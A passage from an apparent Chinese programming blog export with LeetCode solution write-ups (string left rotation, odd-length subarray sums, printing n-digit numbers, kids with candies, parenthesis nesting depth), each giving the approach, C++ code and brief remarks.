<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。请定义一个函数实现字符串左旋转操作的功能。比如，输入字符串”abcdefg”和数字2，该函数将返回左旋转两位得到的结果”cdefgab”。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;abcdefg&quot;, k &#x3D; 2</span><br><span class="line">输出: &quot;cdefgab&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;lrloseumgh&quot;, k &#x3D; 6</span><br><span class="line">输出: &quot;umghlrlose&quot;</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>1 &lt;= k &lt; s.length &lt;= 10000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>使用用string类的函数，substr()截取前面n个字符用insert()函数插入到字符串s的后面，最后erase()删除前面n个字符</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100%，内存消耗8M，击败9.12%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reverseLeftWords</span><span class="params">(<span class="built_in">string</span> s, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//把前面n个字符插入到字符串后面</span></span><br><span class="line">        s.insert(s.length(),s.substr(<span class="number">0</span>,n));</span><br><span class="line">        <span class="comment">//删除字符串前面n个字符</span></span><br><span class="line">        s.erase(<span class="number">0</span>,n);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，也是简单题，Let‘s go on!😐。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>所有奇数长度子数组的和</title>
    <url>/2020/11/09/%E6%89%80%E6%9C%89%E5%A5%87%E6%95%B0%E9%95%BF%E5%BA%A6%E5%AD%90%E6%95%B0%E7%BB%84%E7%9A%84%E5%92%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/sum-of-all-odd-length-subarrays/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个正整数数组 <code>arr</code> ，请你计算所有可能的奇数长度子数组的和。</p>
<p><strong>子数组</strong> 定义为原数组中的一个连续子序列。</p>
<p>请你返回 <code>arr</code> 中 <strong>所有奇数长度子数组的和</strong> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,4,2,5,3]</span><br><span class="line">输出：58</span><br><span class="line">解释：所有奇数长度子数组和它们的和为：</span><br><span class="line">[1] &#x3D; 1</span><br><span class="line">[4] &#x3D; 4</span><br><span class="line">[2] &#x3D; 2</span><br><span class="line">[5] &#x3D; 5</span><br><span class="line">[3] &#x3D; 3</span><br><span class="line">[1,4,2] &#x3D; 7</span><br><span class="line">[4,2,5] &#x3D; 11</span><br><span class="line">[2,5,3] &#x3D; 10</span><br><span class="line">[1,4,2,5,3] &#x3D; 15</span><br><span class="line">我们将所有值求和得到 1 + 4 + 2 + 5 + 3 + 7 + 11 + 10 + 15 &#x3D; 58</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,2]</span><br><span class="line">输出：3</span><br><span class="line">解释：总共只有 2 个长度为奇数的子数组，[1] 和 [2]。它们的和为 3 。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [10,11,12]</span><br><span class="line">输出：66</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= arr.length &lt;= 100</code></li>
<li><code>1 &lt;= arr[i] &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>多个for循环遍历，遍历所有可能的奇数子数组的长度i，然后再遍历所有长度为i的子数组个数，遍历每一个长度为i的子数组求和。</p>
<p>我这个思路是直观解法，应该挺麻烦的，可能有更好的答案，等看题解吧</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败37.26%，内存消耗8.5M，击败20.68%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sumOddLengthSubarrays</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//遍历所有的奇数子数组，i为子数组的长度</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=arr.size();i+=<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="comment">//遍历arr数组,j为长度为i的子数组的个数</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;arr.size()-i+<span class="number">1</span>;++j)&#123;</span><br><span class="line">                <span class="comment">//计算长度为i的每个奇数子数组的和</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;i;++k)&#123;</span><br><span class="line">                    result+=arr[k+j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>解法二</strong>：还有一种效率更高的解法就是计算每个元素在奇数长度子数组中出现的次数，通过看题解得到思路如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">* odd奇数，even偶数</span><br><span class="line">* 对于每个元素i(数组中下标为i)来说，要构成奇数长度的子数组</span><br><span class="line">  即 i左边的元素个数left+i本身自己一个+右边元素的个数right=奇数</span><br><span class="line">  即 left+right=偶数</span><br><span class="line">* 满足a+b=偶数就只有两种情况</span><br><span class="line">  <span class="number">1.</span> 奇数+奇数=偶数</span><br><span class="line">  <span class="number">2.</span> 偶数+偶数=偶数</span><br><span class="line">* <span class="number">1.</span> 所以只需要求得i左边可以选择奇数长度的可能有多少种，即left_odd,同样求右边奇数right_odd</span><br><span class="line">     就可以求出策略<span class="number">1</span>有多少种可能</span><br><span class="line">  <span class="number">2.</span> 所以只需要求得i左边可以选择偶数长度的可能有多少种，即left_odd,同样求右边偶数right_odd</span><br><span class="line">     就可以求出策略<span class="number">1</span>有多少种可能，注意<span class="number">0</span>也算选择的一种可能</span><br><span class="line">* 即元素i在所有奇数长度子数组出现的次数总和是</span><br><span class="line">  left_odd*right_odd+left_even*right_even</span><br><span class="line">* 元素i左边元素共有i个，右边元素共有siz-i<span class="number">-1</span>个</span><br></pre></td></tr></table></figure>
<p><strong>c++代码：</strong>（执行4ms，击败91.05,%，内存8.6M，击败8.85%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sumOddLengthSubarrays</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.size(); i ++)&#123;</span><br><span class="line">            <span class="keyword">int</span> left = i + <span class="number">1</span>, right = arr.size() - i,</span><br><span class="line">                left_even = (left + <span class="number">1</span>) / <span class="number">2</span>, right_even = (right + <span class="number">1</span>) / <span class="number">2</span>,</span><br><span class="line">                left_odd = left / <span class="number">2</span>, right_odd = right / <span class="number">2</span>;</span><br><span class="line">            res += (left_even * right_even + left_odd * right_odd) * arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，我提交的代码时间复杂度是$O(n^3)$，然后看别人的题解有复杂度$O(n)$的方法，其实就是计算每个元素在奇数长度子数组中出现的次数，做的时候我考虑过，因为时间问题就选择了这个暴力解法，毕竟也能通过不是吗😏，现在还是刷题没考虑太多最优解的问题，不然真的要花费很多时间，现在事情多也不能专门去研究这种题。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>打印从1到最大的n位数</title>
    <url>/2020/11/10/%E6%89%93%E5%8D%B0%E4%BB%8E1%E5%88%B0%E6%9C%80%E5%A4%A7%E7%9A%84n%E4%BD%8D%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/da-yin-cong-1dao-zui-da-de-nwei-shu-lcof/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>输入数字 <code>n</code>，按顺序打印出从 1 到最大的 n 位十进制数。比如输入 3，则打印出 1、2、3 一直到最大的 3 位数 999。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: n &#x3D; 1</span><br><span class="line">输出: [1,2,3,4,5,6,7,8,9]</span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<ul>
<li>用返回一个整数列表来代替打印</li>
<li>n 为正整数</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>直接遍历，简简单单。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败99.63%，内存消耗11.7M，击败8.50%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">printNumbers</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="built_in">pow</span>(<span class="number">10</span>,n);++i)&#123;</span><br><span class="line">            result.push_back(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，这题太简单了😕</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>拥有最多糖果的孩子</title>
    <url>/2020/11/06/%E6%8B%A5%E6%9C%89%E6%9C%80%E5%A4%9A%E7%B3%96%E6%9E%9C%E7%9A%84%E5%AD%A9%E5%AD%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/kids-with-the-greatest-number-of-candies/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个数组 <code>candies</code> 和一个整数 <code>extraCandies</code> ，其中 <code>candies[i]</code> 代表第 <code>i</code> 个孩子拥有的糖果数目。</p>
<p>对每一个孩子，检查是否存在一种方案，将额外的 <code>extraCandies</code> 个糖果分配给孩子们之后，此孩子有 <strong>最多</strong> 的糖果。注意，允许有多个孩子同时拥有 <strong>最多</strong> 的糖果数目。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：candies &#x3D; [2,3,5,1,3], extraCandies &#x3D; 3</span><br><span class="line">输出：[true,true,true,false,true] </span><br><span class="line">解释：</span><br><span class="line">孩子 1 有 2 个糖果，如果他得到所有额外的糖果（3个），那么他总共有 5 个糖果，他将成为拥有最多糖果的孩子。</span><br><span class="line">孩子 2 有 3 个糖果，如果他得到至少 2 个额外糖果，那么他将成为拥有最多糖果的孩子。</span><br><span class="line">孩子 3 有 5 个糖果，他已经是拥有最多糖果的孩子。</span><br><span class="line">孩子 4 有 1 个糖果，即使他得到所有额外的糖果，他也只有 4 个糖果，无法成为拥有糖果最多的孩子。</span><br><span class="line">孩子 5 有 3 个糖果，如果他得到至少 2 个额外糖果，那么他将成为拥有最多糖果的孩子。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：candies &#x3D; [4,2,1,1,2], extraCandies &#x3D; 1</span><br><span class="line">输出：[true,false,false,false,false] </span><br><span class="line">解释：只有 1 个额外糖果，所以不管额外糖果给谁，只有孩子 1 可以成为拥有糖果最多的孩子。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：candies &#x3D; [12,1,12], extraCandies &#x3D; 10</span><br><span class="line">输出：[true,false,true]</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>2 &lt;= candies.length &lt;= 100</code></li>
<li><code>1 &lt;= candies[i] &lt;= 100</code></li>
<li><code>1 &lt;= extraCandies &lt;= 50</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>求出数组中的最大值max，再遍历数组对每一个元素如果值加上extraCandies&lt;max,则结果为false,否则为true。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败85.21%，内存消耗9.1M，击败10.50%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; <span class="title">kidsWithCandies</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candies, <span class="keyword">int</span> extraCandies)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; result;</span><br><span class="line">        <span class="keyword">int</span> max=*max_element(candies.begin(),candies.end());</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> i:candies)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i+extraCandies&lt;max)&#123;</span><br><span class="line">                result.push_back(<span class="literal">false</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                result.push_back(<span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a><a href="https://leetcode-cn.com/problems/kids-with-the-greatest-number-of-candies/solution/yong-you-zui-duo-tang-guo-de-hai-zi-by-leetcode-so/">官方题解：</a></h6><p><strong>方法一：枚举</strong><br>思路</p>
<p>如果我们希望某个小朋友拥有的糖果最多，那么最优的方案当然是把额外的所有糖果都分给这个小朋友。因此，我们可以枚举每一个小朋友，并将额外的所有糖果都分给这个小朋友，然后再用$O(n)$ 的时间遍历其余的小朋友，就可以判断这个小朋友是否拥有最多的糖果。</p>
<p>上述方法的时间复杂度为 $O(n^2)$，然而我们可以将其优化为$O(n)$。事实上，对于每一个小朋友，只要这个小朋友「拥有的糖果数目」加上「额外的糖果数目」大于等于所有小朋友拥有的糖果数目最大值，那么这个小朋友就可以拥有最多的糖果。</p>
<p><strong>证明</strong></p>
<p>设某个小朋友的糖果数为 $x$，其余小朋友拥有的糖果数目最大值为 $y$，额外的糖果数为 $e$。这个小朋友可以拥有最多的糖果，当且仅当</p>
<script type="math/tex; mode=display">
x+e \geq y</script><p>由于 $x+e≥x$ 显然成立，那么我们有</p>
<script type="math/tex; mode=display">
x+e≥max(x,y)</script><p>而 $max(x,y)$ 就是所有小朋友拥有的糖果数目最大值。因此我们可以预处理出这个值，随后枚举每一个小朋友，只要这个小朋友「拥有的糖果数目」加上「额外的糖果数目」大于等于这个值，就可以满足要求。</p>
<p><strong>代码：</strong>（执行4ms，击败85.21%，内存9.2M，击败5.13%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; <span class="title">kidsWithCandies</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candies, <span class="keyword">int</span> extraCandies)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = candies.size();</span><br><span class="line">        <span class="keyword">int</span> maxCandies = *max_element(candies.begin(), candies.end());</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; ret;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            ret.push_back(candies[i] + extraCandies &gt;= maxCandies);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>假设小朋友的总数为 $n$。</p>
<p><strong>时间复杂度：</strong>我们首先使用 $O(n)$ 的时间预处理出所有小朋友拥有的糖果数目最大值。对于每一个小朋友，我们需要 $O(1)$ 的时间判断这个小朋友是否可以拥有最多的糖果，故渐进时间复杂度为 $O(n)$。</p>
<p><strong>空间复杂度：</strong>这里只用了常数个变量作为辅助空间，与 $n$ 的规模无关，故渐进空间复杂度为 $O(1)$。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，感觉官方题解最后结果push_back比我还简洁，不知道为什么效率还没我的高呢😄，Let‘s go on!。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>括号的最大嵌套深度</title>
    <url>/2020/11/09/%E6%8B%AC%E5%8F%B7%E7%9A%84%E6%9C%80%E5%A4%A7%E5%B5%8C%E5%A5%97%E6%B7%B1%E5%BA%A6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/maximum-nesting-depth-of-the-parentheses/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>如果字符串满足一下条件之一，则可以称之为 <strong>有效括号字符串（valid parentheses string</strong>，可以简写为 <strong>VPS）</strong>：</p>
<ul>
<li>字符串是一个空字符串 <code>&quot;&quot;</code>，或者是一个不为 “(“ 或 <code>&quot;)&quot;</code> 的单字符。</li>
<li>字符串可以写为 <code>AB</code>（A 与 <code>B</code> 字符串连接），其中 <code>A</code> 和 <code>B</code> 都是 有效括号字符串 。</li>
<li>字符串可以写为 (A)，其中 <code>A</code> 是一个 有效括号字符串 。</li>
</ul>
<p>类似地，可以定义任何有效括号字符串 S 的 嵌套深度 <code>depth(S)</code>：</p>
<ul>
<li><code>depth(&quot;&quot;) = 0</code></li>
<li><code>depth(C) = 0</code>，其中 <code>C</code> 是单个字符的字符串，且该字符不是 <code>&quot;(&quot;</code> 或者 “)”</li>
<li><code>depth(A + B) = max(depth(A), depth(B))</code>，其中 <code>A</code> 和 <code>B</code> 都是 有效括号字符串</li>
<li><code>depth(&quot;(&quot; + A + &quot;)&quot;) = 1 + depth(A)</code>，其中 <code>A</code> 是一个 <strong>有效括号字符串</strong></li>
</ul>
<p>例如：<code>&quot;&quot;</code>、<code>&quot;()()&quot;</code>、”()(()())” 都是 <strong>有效括号字符串</strong>（嵌套深度分别为 0、1、2），而 <code>&quot;)(&quot;</code> 、<code>&quot;(()&quot;</code> 都不是 有效括号字符串 。</p>
<p>给你一个 <strong>有效括号字符串</strong> <code>s</code>，返回该字符串的 <code>s</code> <strong>嵌套深度</strong> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;(1+(2*3)+((8)&#x2F;4))+1&quot;</span><br><span class="line">输出：3</span><br><span class="line">解释：数字 8 在嵌套的 3 层括号中。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;(1)+((2))+(((3)))&quot;</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;1+(2*3)&#x2F;(2-1)&quot;</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;1&quot;</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 100</code></li>
<li><code>s</code> 由数字 <code>0-9</code> 和字符 <code>&#39;+&#39;</code>、<code>&#39;-&#39;</code>、<code>&#39;*&#39;</code>、<code>&#39;/&#39;</code>、<code>&#39;(&#39;、&#39;)&#39;</code> 组成</li>
<li>题目数据保证括号表达式 <code>s</code> 是 <strong>有效的括号表达式</strong></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历字符串s的字符，如果是’(‘则深度加1，如果是’)’则保存当前最大深度，然后深度减1。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败53.54%，内存消耗6.4M，击败12.02%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>,tmp=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                ++tmp;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(tmp&gt;result)&#123;</span><br><span class="line">                    result=tmp;</span><br><span class="line">                &#125;</span><br><span class="line">                --tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

